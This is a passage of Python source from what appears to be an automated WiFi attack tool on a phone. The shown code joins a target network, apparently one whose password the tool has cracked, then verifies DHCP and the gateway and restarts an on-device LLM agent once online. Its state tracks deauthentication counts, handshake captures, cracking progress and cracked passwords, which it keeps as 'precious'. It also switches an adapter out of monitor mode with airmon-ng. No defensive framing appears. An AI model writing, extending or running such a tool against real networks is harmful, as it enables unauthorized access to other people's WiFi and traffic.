                     "shell@127.0.0.1", wpa_cmds],
                    capture_output=True, text=True, timeout=20)
                _file_logger.info("wpa_cli fallback: rc=%d out=%s", r2.returncode, r2.stdout.strip()[:200])

            _push_feed("connect", "WiFi association requested — waiting for DHCP...")
            # Wait for Android to obtain IP (it handles DHCP internally)
            time.sleep(8)

            # Verify
            r = subprocess.run(["ip", "-4", "addr", "show", "wlan0"],
                               capture_output=True, text=True, timeout=5)
            _file_logger.info("wlan0 addr: %s", r.stdout.strip()[:200])
            m = re.search(r'inet (\d+\.\d+\.\d+\.\d+)', r.stdout)
            if m:
                ip = m.group(1)
                _push_feed("connect", f"IP obtained: {ip}")

                # Ping gateway
                gw = re.sub(r'\.\d+$', '.1', ip)
                ping = subprocess.run(["ping", "-c", "1", "-W", "3", gw],
                                      capture_output=True, timeout=5)
                if ping.returncode == 0:
                    _push_feed("connect", f"Gateway {gw} reachable — connected!")
                    _state["_connected_at"] = time.time()  # Prevent auto-revert to offline
                    _set_stage(5)
                    _push_feed("connect", "ONLINE — restarting services...")
                    _persist_state()
                    _restart_services_for_online()
                    return {"ok": True, "ip": ip}
                else:
                    _push_feed("connect", f"Gateway {gw} unreachable")
                    _state["error"] = "Gateway unreachable"
            else:
                _push_feed("connect", "No IP obtained from DHCP")
                _state["error"] = "DHCP failed"

            _persist_state()
            return {"error": _state["error"]}

        except Exception as e:
            _state["error"] = str(e)
            _push_feed("error", f"Connect failed: {e}")
            return {"error": str(e)}


def force_offline():
    """Force the system into offline mode. Cleans ephemeral data but preserves handshakes.

    wifi_handshakes are precious (cracked passwords) — never deleted here.
    If a password was previously found for the current target, preserve that state.
    """
    with _lock:
        # Remember if current target had a cracked password
        prev_password = _state.get("password", "")
        prev_ssid = _state.get("target_ssid", "")
        prev_bssid = _state.get("target_bssid", "")
        prev_capture = _state.get("capture_file", "")

        _state["stage"] = 0
        _state["stage_name"] = "SCANNING"
        _state["target_ssid"] = ""
        _state["target_bssid"] = ""
        _state["target_channel"] = 0
        _state["target_encryption"] = ""
        _state["handshake_captured"] = False
        _state["capture_file"] = ""
        _state["crack_progress"] = 0.0
        _state["crack_speed"] = ""
        _state["crack_candidates"] = 0
        _state["crack_total"] = 0
        _state["crack_eta"] = ""
        _state["crack_wordlist"] = ""
        _state["password"] = ""
        _state["deauth_count"] = 0
        _state["error"] = ""
        _state["started_at"] = _now()

        # If previous target had a cracked password, keep target info
        if prev_password and prev_bssid:
            _state["target_ssid"] = prev_ssid
            _state["target_bssid"] = prev_bssid
            _state["capture_file"] = prev_capture
            _state["password"] = prev_password
            _state["handshake_captured"] = True

        _wifi_feed.clear()
        # Clear stale wifi scan data — but NOT handshakes (precious cracked passwords)
        try:
            conn = db._get_conn()
            conn.execute("DELETE FROM wifi_networks")
            conn.commit()
        except Exception:
            pass
        _push_feed("system", "Entered OFFLINE mode")
        # Always kill agent + llama-server in offline mode to free RAM/GPU
        # Phone is much more responsive without them running
        if not SIMULATE:
            _push_feed("system", "Stopping agent + LLM to free RAM for WiFi operations")
            _kill_services_for_offline()
        _persist_state()
        return {"ok": True}


def force_online():
    """Force the system into online mode."""
    with _lock:
        _set_stage(5)
        _push_feed("system", "Forced into ONLINE mode")
        _restart_services_for_online()
        return {"ok": True}


def cleanup():
    """Kill all subprocesses and restore wlan0."""
    global _scan_proc, _capture_proc, _crack_proc
    _kill_proc(_scan_proc)
    _kill_proc(_capture_proc)
    _kill_proc(_crack_proc)
    _scan_proc = None
    _capture_proc = None
    _crack_proc = None

    if not SIMULATE:
        try:
            # Restore external adapter to managed mode
            ext_iface = _state.get("_ext_iface", EXT_IFACE)
            mon_iface = _state.get("_mon_iface", ext_iface + "mon")
            subprocess.run(["airmon-ng", "stop", mon_iface],
                           capture_output=True, timeout=10)
            subprocess.run(["ip", "link", "set", ext_iface, "down"],
                           capture_output=True, timeout=5)
            subprocess.run(["iw", "dev", ext_iface, "set", "type", "managed"],
                           capture_output=True, timeout=5)
            subprocess.run(["ip", "link", "set", ext_iface, "up"],
                           capture_output=True, timeout=5)
        except Exception:
            pass
